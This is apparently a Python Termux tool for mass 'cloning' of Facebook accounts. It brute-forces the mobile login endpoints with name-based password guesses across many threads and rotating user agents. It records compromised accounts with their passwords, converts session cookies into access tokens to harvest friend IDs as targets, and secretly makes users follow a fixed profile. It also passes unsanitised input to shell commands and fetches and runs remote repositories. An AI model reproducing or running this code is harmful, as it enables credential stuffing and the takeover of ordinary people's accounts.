
#---------------------[IMPORT]---------------------
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from time import sleep
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import os,sys,time,json,random,re,string,platform,base64,uuid
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
    os.system('pip install --upgrade pip && pip install requests futures==2 > /dev/null')
    os.system('python AHMED.py')
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; AHMED \x07')

import requests
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
import marshal
import shutil
import webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
# from rich import print as printer
from datetime import date
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
import os
try:
    import requests
except(ImportError):
    os.system("pip install requests")
    pass
ranasys = ("anaaahilsystems")
try:
    import socks
except(ImportError):
    os.system("pip install -U requests[socks]")
    pass
try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpe

rug=[]
for nt in range(10000):
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}.1.0; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    rug.append(xx)

HBF = '{ HBF }'
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
AHMED2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
import random

def clear():
    os.system('clear')
    print(logo)
#--------------------COLORS--------------------#

A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'
E = '\x1b[1;93m'
F = '\x1b[1;94m'
G = '\x1b[1;95m'
PURPLE ='\x1b[38;5;46m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"

#--------------------LOGO--------------------#
logo ="""     \033[1;37m____ \033[1;32m             ______     _______   \033[1;37m____   
    \033[1;37m(  __)\033[1;32m |\     /|  (  ___ \   (  ____ \ \033[1;37m(__  )  
    \033[1;37m| (\033[1;32m    | )   ( |  | (   ) )  | (    \/\033[1;37m    ) | 
    \033[1;37m| |\033[1;32m    | (___) |  | (__/ /   | (__\033[1;37m        | |  
    \033[1;37m| |\033[1;32m    |  ___  |  |  __ (    |  __)\033[1;37m       | |  
    \033[1;37m| |\033[1;32m    | (   ) |  | (  \ \   | (\033[1;37m          | |  
    \033[1;37m| (__\033[1;32m  | )   ( |  | )___) )  | )\033[1;37m        __) |  
    \033[1;37m(____)\033[1;32m |/     \|  |/ \___/   |/\033[1;37m        (____)
\033[1;37m╔\033[1;36mⒽⒷⒻ\033[1;37m═══════════════════\033[1;36m𝐇𝐁𝐅✯𝐓𝐄𝐀𝐌\033[1;37m═════════════════\033[1;36mⒽⒷⒻ\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32m AHMED SHAR🖤         \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mFUCK SOCIAL MEDIA          \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m AHMED-king-06                  \033[1;31m │
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mAHMED WORLD                  \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m0.1                          \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32mFACEBOOK TRICKS AND HELPING ZONE\033[1;37m {\033[1;36mHBF\033[1;37m} \033[1;31m│
\033[1;37m╚\033[1;36mⒽⒷⒻ\033[1;37m══════\033[41m\033[1;37m[ 𓆩𝐇𝐈𝐋𝐀𝐑𝐈𝐎𝐔𝐒𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪  𓆩𝐅𝐎𝐑𝐂𝐄𓆪 ]\x1b[0m══════\033[1;36mⒽⒷⒻ\033[1;37m╝

\033[1;31m======================================================"""



def linex():
    print(f'{RED}======================================================')




loop = 0
ok = []
cp = []
tf = []
ua_android = []
ua_opera = []
user=[]
ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
def exit():
    os.sys.exit()




def saprate():
    os.system('clear')
    print(logo)
    print('           \x1b[97m[\033[37;41m  L I N K S   M E N U   \033[0;m] ')
    try:
        limit = int(input(' HOW MANY LINKS DO YOU WANT TO SPRATE  >: '))
        print("")
        print("")
    except:
        limit = 1
    print('           \x1b[97m[\033[37;41m  S A P R A T E   M E N U   \033[0;m] ')
    print("")
    print('\033[1;32m PUT YOUR FILE FOR SPRATE')
    file_name = input('\033[1;33m FILE PATH: ')
    print("")
    print(" PUT YOUR NEW FILE NAME ")
    print('\033[1;32m Example /sdcard/AHMED-81.txt')
    new_save = input('\033[1;33m NEW FILE PATH: ')
    y = 0
    for k in range(limit):
        y += 1
        print("")
        print("")
        print('\033[1;32m EXAMPLE [100080],[100081] [100083] ETC  \033[0m')
        print("")
        links = input(' \033[1;33mPUT LINKS  %s:\033[1;32m ' % (y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(54*"\033[1;33m_")
    print("")
    print('\033[1;33m LINKS GRABBED SUCCESSFULLY')
    print(' TOTAL GRABBED LINKS:\033[1;32m   ' +
          str(len(open(new_save).read().splitlines())))
    print('\033[1;33m NEW FILE SAVE AS: \033[1;32m  '+new_save)
    print(54*"\033[1;33m_")
    print("")
    input('\033[1;32m PRESS ENTER TO BACK ')
    main()

def remove_dub():
    os.system('clear')
    print(logo)
    print('           \x1b[97m[\033[37;41m  DUBBLE LINKS CUTTER MENU   \033[0;m] ')
    print("[+] EXAMPLE : /sdcard/your_file_name.txt  \n\n")
    print("")
    Error = input('[+] FILE PATH   : ')
    print("")
    Error1 = input('[+] NEW FILE SAVE AS : ')
    os.system('touch ' + Error)
    os.system('sort -r '+Error+' | uniq > '+Error1)
    print("")
    print("")
    print(54*"\033[1;33m_")
    print("")
    print("[+] REMOVING DUBBLE LINKS SUCCESSFULLY " + Error)
    print("[+] NEW FILE SAVE AS : " + Error1)
    print(54*"\033[1;33m_")
    print("")
    input('\033[1;32m PRESS ENTER TO BACK ');main()



#--------------------MAIN MENU--------------------#
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    xc = ltx-12
    tag = "PM"
else:
    xc = ltx
    tag = "AM"


def main():
    os.system('clear && rm -rf .txt .t.txt')
    print(logo)
    print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
    print(f'{BLUE}══════════════════════════════════════════════════════')
    print("           \x1b[97m[\033[37;41m  WELCOME. TO AHMED TOOL \033[0;m] ")
    print(f" {WHITE}TODAY DATE     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
    print(f" {WHITE}USER NAME      : {BLUE}"+NameX)
    print(f"{BLUE}══════════════════════════════════════════════════════")
    print(f"{RED}[01] {WHITE}RANDOM CLONE {RED}[Not Updated]")
    print(f"{RED}[02] {WHITE}FILE CLONING{GREEN} [   BEST    ]")
    print(f"{RED}[03] {WHITE}FILE CREATE  {GREEN}[NEW METHOD ] ")
    print(f"{RED}[04] {WHITE}FILE CREATE  {GREEN}[ UNLIMITED ]")
    print(f"{RED}[05] {WHITE}SPRATE LINKS FROM FILE")
    print(f"{RED}[06] {WHITE}DUBBLE LINK CUTTER")
    print(f"{RED}[07] {WHITE}DATA PROTECTOR")
    print(f"{RED}[08] {WHITE}CYTHON CHANGER")
    print(f"{RED}[09] {WHITE}FACEBOOK BOT")
    print(f"{RED}[10] {WHITE}MY YOUTUBE CHANNEL")
    print(f"{RED}[00] {WHITE}EXIT PROGRAM")
    linex()
    AHMED = input("[√] CHOOSE : ")
    if AHMED in ["1","01"]: 
        passx()
    elif AHMED in ["2","02"]:
        file_crack()
    elif AHMED in ["3","03"]:
        Filex()
    elif AHMED in ["4","04"]:
        File_creating()
    elif AHMED in ["5","05"]:
        saprate()
    elif AHMED in ["6","06"]:
        remove_dub()
    elif AHMED in ["7","07"]:
        PROTECT()
    elif AHMED in ["8","08"]:
        CYTHONIZER()
    elif AHMED in ["9","09"]:
        BOTX()
    elif AHMED in ["10","10"]:
        os.system("xdg-open https://youtube.com/@AHMEDSHARVLOGS1")
    elif AHMED in ["0","00"]:
        os.system('rm -rf fb_cookies.txt')
        exit()
    else:
        print('\033[1;31mINCORECT OPTION !!!!');main()





def File_creating():
    os.system(f"git clone https://github.com/AHMED-king-06/DUMP && cd DUMP && python DUMP.py")

def PROTECT():
    os.system(" rm -rf DATA_PROTECT && git clone https://github.com/AHMED-king-06/DATA_PROTECT && cd DATA_PROTECT && python PROTECTOR.py")

def CYTHONIZER():
    os.system("rm -rf Cython_Changer && git clone https://github.com/AHMED-king-06/Cython_Changer && cd Cython_Changer && python3 Run.py")


def BOTX():
    os.system("rm -rf BOT && git clone https://github.com/AHMED-king-06/ BOT && cd BOTgit clone https://github.com/AHMED-king-06/ BOT && cd BOT && python3 AHMED.py")

def file_crack():
    global ok,cp,tf
    os.system('clear')
    print(logo)
    print('           \x1b[97m[\033[37;41m  S E R V E R   M E N U   \033[0;m] ')
    print("")
    print(f"{RED}[1] {WHITE}SERVER NUM 1 (BEST)")
    print(f"{RED}[2] {WHITE}SERVER NUM 2 (NORMAL)")
    linex()
    opt_method = input(f'CHOOSE SERVER {AHMED2} : ')
    os.system('clear')
    print(logo)
    print('           \x1b[97m[\033[37;41m  F I L E   M E N U   \033[0;m] ') 
    print("")
    file = input(' FILE PATH: ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(' YOUR GIVEN FILE IS NOT FOUND IN STORAGE ⚠️ ...')
        time.sleep(1)
        file_crack()
    plist = []
    try:
        clear()
        print('           \x1b[97m[\033[37;41m  P A S S   M E N U   \033[0;m] ')
        print("")
        print(f"{WHITE}HOW MANY PASSWORDS YOU WANT TO ADD ")
        print("FOR EXAMPLE (firstlast, First Last, first123, first last)")
        print("")
        ps_limit = int(input(' PUT LIMIT : '))
    except:
        ps_limit =1
    print(' ')
    for i in range(ps_limit):
        plist.append(input(f' PUT PASS  {i+1}: '))
    with ThreadPool(max_workers=30) as crack_submit:
        os.system('clear')
        print(logo)
      #  show(' Use flight mode before using starting crack')
        total_ids = str(len(fo))
        print(f' {WHITE}TOTAL IDZ            {BLUE} : '+total_ids)
        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f" {WHITE}USE AEROPLANE MOOD FOR BOOST UP CLONING ")
        linex()
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if opt_method =='1':
                crack_submit.submit(method1,ids,names,passlist,total_ids)
            elif opt_method =='2':
                crack_submit.submit(method2,ids,names,passlist,total_ids)
            else:
                crack_submit.submit(method1,ids,names,passlist,total_ids)
    print('\n\033[1;37m[+]══════════════════════════════════════════')
    print('[•] CLONING COMPLETED\n[•] YOUR OK IDS : '+str(len(ok))+'\n[•] TOTAL CP IDS : '+str(len(cp)))
    print('\033[1;37m[+]══════════════════════════════════════════')
    print('[•] OK IDS SAVE : /sdcard/AHMED_OK.txt\n[•] CP IDS SAVE : /sdcard/AHMED_CP.txt')
    input('[•] PRESS ENTER TO BACK MENU   ')
    main()
def method1(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    rcol =['\033[1;32mM-1','\033[1;31mM-1']
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}[AHMED 🔥]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            ua = random.choice(ugen)
            ua1 = random.choice(rug)
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            url1 = f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr'
            hed1 = {"Host":'p.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua1,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            req1 = r.get(url1,headers=hed1)
            data = {'lsd' : re.search('name="lsd" value="(.*?)"',str(req1.text)).group(1),'jazoest' : re.search('name="jazoest" value="(.*?)"',str(req1.text)).group(1),'uid' : ids,'pass' : pas,'next' : f'https://p.facebook.com/login/save-device/','flow' : 'login_no_pin','submit' : 'Log In'}
            url2 = f'https://p.facebook.com/login/device-based/validate-password/?shbl=0'
            hed2 = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'en-US,en;q=0.9','x-requested-with': 'mark.via.gp','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': f'https://p.facebook.com','referer': f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
            next = r.post(url2,data=data,headers=hed2,allow_redirects = False).text
            cookies = r.cookies.get_dict().keys()
            if 'c_user' in cookies:
                os.system("play-audio AHMED_OK.mp3")
                print('\r\033[1;32m[AHMED-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('/sdcard/AHMED_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d):
                    os.system("play-audio AHMED_2F.mp3")
                    print('\r\033[1;35m[AHMED-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('/sdcard/AHMED_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio AHMED_CP.mp3")
                    print('\r\033[1;31m[AHMED-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
                    open('/sdcard/AHMED_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
    except Exception as e:
        pass

def method2(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    rcol =['\033[1;32mM-2','\033[1;31mM-2']
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}[AHMED 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            session = requests.Session()
            url = 'https://mbasic.facebook.com/?ref=opera_speed_dial_freefb'
            raw = session.get(url).text
            payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(raw)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(raw)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(raw)).group(1),"li":re.search('name="li" value="(.*?)"', str(raw)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,"pass":pas,"login":"Log In"}
            header = ({'authority':'https://mbasic.facebook.com',
            'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'*;q=0.1',
            'accept-language':'en-PK,en;q=0.9',
            'cache-control':'private, no-cache, no-store, must-revalidate',
            'upgrade-insecure-requests':'1',
            'user-agent':random.choice(ugen),
            'connection':'keep-alive'})
            post_request = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8&amp;ref=opera_speed_dial_freefb',data=payload,headers=header).text
            cookies = session.cookies.get_dict().keys()
            #open('jhuk.html', 'w').write(post_request)
            if 'c_user' in cookies:
                os.system("play-audio AHMED_OK.mp3")
                print('\r\033[1;32m[AHMED-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('/sdcard/AHMED_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d.group(1)):
                    os.system("play-audio AHMED_2F.mp3")
                    print('\r\033[1;35m[AHMED-2F] '+ids+' | '+pas+'\033[0;97m')
                    tf.append(ids)
                    open('/sdcard/AHMED_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio AHMED_CP.mp3")
                    print('\r\033[1;31m[AHMED-CP] '+ids+' | '+pas+'\033[0;97m')
                    cp.append(ids)
                    open('/sdcard/AHMED_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
    except Exception as e:
        pass

def random_method(ids,passlist,total_ids):
    global ua,loop,ok,cp,tf,ua_opera
    rcol =['\033[1;32mO_O','\033[1;31m -_-']
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r{WHITE}[AHMED 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        for pas in passlist:
            xyz = requests.Session()
            pro = random.choice(rug)
            header = ({'authority':'business.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'referer': 'https://free.facebook.com/login/',
            'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':pro,
            'connection':'keep-alive'})
            url = 'https://free.facebook.com/?ref=opera_speed_dial_freefb'
            raw = xyz.get(url).text
            koki = (";").join([ "%s=%s" % (key, value) for key, value in xyz.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2; wd=412x756'
            payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(raw)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(raw)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(raw)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(raw)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In",
            "_fb_noscript":"true"
            }
            post_request = xyz.post('https://business.facebook.com/login/device-based/regular/login/?refsrc',data=payload,headers=header,cookies={'cookie':koki}).text
            #open('iii.html', 'w').write(post_request)
            cookies = xyz.cookies.get_dict().keys()
            if 'c_user' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[7:22]
                if cid in ok:
                    pass
                else:
                    os.system("play-audio AHMED_OK.mp3")
                    print('\r\033[1;92m[AHMED-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/AHMED_OK.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[24:39]
                if cid in tf:
                    pass
                else:
                    d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
                    if 'Enter login code to continue' in str(d.group(1)):
                        os.system("play-audio AHMED_2F.mp3")
                        print('\r\033[1;95m[AHMED-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('/sdcard/AHMED_2F.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                        else:
                            os.system("play-audio AHMED_CP.mp3")
                            print('\r\033[1;94m[AHMED-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/AHMED_CP.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
         #   else:
               # print(ua_opera)
        loop+=1
    except Exception as e:
        pass











################[FILE CLONE]###################
def Filex():
    os.system("clear")
    print(logo) 
    print("[01] CREATE FILE")
    print("[02] REMOVE OLD COOKIES")
    print("[E] EXIT")
    linex() 
    check=input(f" CHOOSE {AHMED2} :")
    if check in ['01','1']:
        file_m()
    elif check in ['02','2']:
        os.system("rm -rf  .cok.txt")
        os.system("rm -rf  .tok.txt")
        print("SUCCESSFUL LY COOKIES REMOVED ")
    elif check in ['e','E']:
        exit()

def convert(cookie):
    cookies = {"cookie":cookie}
    res = requests.Session().get('https://business.facebook.com/business_locations', headers = {
        'user-agent'     :     'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
        'referer'     :     'https://www.facebook.com/',
        'host'     :     'business.facebook.com',
        'origin'     :     'https://business.facebook.com',
        'upgrade-insecure-requests'     :     '1',
        'accept-language'     :     'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control'     :     'max-age=0',
        'accept'     :     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'content-type'     :     'text/html; charset=utf-8'
        }, cookies = cookies)
    try:
        token = re.search('(EAAG\w+)',str(res.text)).group(1)
    except:
        token = "Cookies Invalid"
    finally:
        return token



def file_m():
    list_ = []
    os.system("clear")
    print(logo)
    try:
        tok = open(".tok.txt",'r').read()
        cok = open(".cok.txt",'r').read()
    except:
        os.system("clear")
        print(logo)
        cookie = input(" Putt cookies : ")
        token = convert(cookie)
        if token == "Cookies Invalid":
            print(" Coockies expire use new to login")
            time.sleep(4)
            Filex()
        else:
            open(".cok.txt",'w').write(cookie)
            open(".tok.txt",'w').write(token)
            file_m()
    try:
        r_n = requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={tok}",cookies={"cookie":cok}).json()
        print(f"\t   {GREEN}   welcome :  "+(r_n["name"]))
        time.sleep(2)
        pass
    except:
        print(" token and cookies expire")
        time.sleep(2)
        os.system("rm -rf .cok.txt")
        os.system("rm -rf .tok.txt")
        Filex()
    os.system("clear")
    print(logo)
    print(" example digits : 100083 100084 100085 etc")
    print("")
    linkx = input(" PUT EXTRACT DIGIT: ")
    link1 = linkx.replace(" ", "\n")
    link1 = link1.splitlines()
    lines = []
    fav = []
    print("\n\n")
    linex()
    paste = "PASTE IDZ  :"
    while True:
        line = input(''+paste+'')
        if line:
            lines.append(line)
            paste = " PRESS ENTER "
        else:
            break
    os.system("clear")
    print(logo)
    print(f"          \x1b[97m[\033[37;41m  DUMPING STARTED BE PATIENT.. ❤ \033[0;m] ")
    linex()
    print("")
    for xid in lines:
        sys.stdout.write("\r from: [{}] links: [{}] total:[{}]".format(xid, linkx, str(len(fav))))
        sys.stdout.flush()
        try:
            xx = requests.get('https://graph.facebook.com/'+xid+'?fields=friends.fields(name,id)&access_token='+tok,cookies={"cookie":cok}).json()['friends']
            for xc in xx["data"]:
                for fav_links in link1:
                    if fav_links in xc["id"]:
                        fav.append(xc["id"]+"|"+xc["name"])
                        open("filemere.txt",'a').write(xc["id"]+"\n")
                    else:
                        pass
        except(KeyError,IOError,OSError):
            pass
    print("")
    print('\n Example: /sdcard/AHMED.txt ')
    print("")
    s_file = input(" ENTER FILE PATH: ")
    for uuids in fav:
        try:
            open(s_file,'a').write(uuids+"\n")
        except:
            print(" PUT CORRECT ✔ PATH")
            print("")
            linex()
            print(" YOUR FILE SAVE IN: "+s_file)
            input(" PRESS ENTER TO BACK")
            linex()
            Filex()















clear()
print("\n\n")
xxxx = str(len(rug))
jalan(" \x1b[38;5;196mTOTAL USER AGENTS : " + xxxx)
print(" HEY USER GIVE ME SOME YOUR INFORMATION ❤")
print("")
NameX =input('\x1b[38;5;46m [•] \x1b[38;5;46mWHAT IS YOUR NAME : ')

def linex():
    print(f'{RED}======================================================')

#---------------------[LOOP MENU]---------------------#
loop = 0
cp = []
ok = []
twf = []



#---------------------[APPLICATION CHECKER]---------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Active  Apk  ')
    else:
        print(f'\r[🎮] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}')
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
            #created by hbf team(owner) AHMED
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Expired Apk{WHITE}')
        print(54*'-')
    else:
        print(f'\r[🎮] \x1b[38;5;196m ◇ Your Expired Apps ◇    :{WHITE}')
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(57*'-')

 

def follow(ses,coki):
    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text







def passx():
    os.system("clear")
    print(logo)
    print('           \x1b[97m[\033[37;41m  P A S S   M E N U   \033[0;m] ')
    print("")
    print(f"{RED}[01] {WHITE}AUTO PASS 7 DIGITS         {GREEN}[FASTEST]")
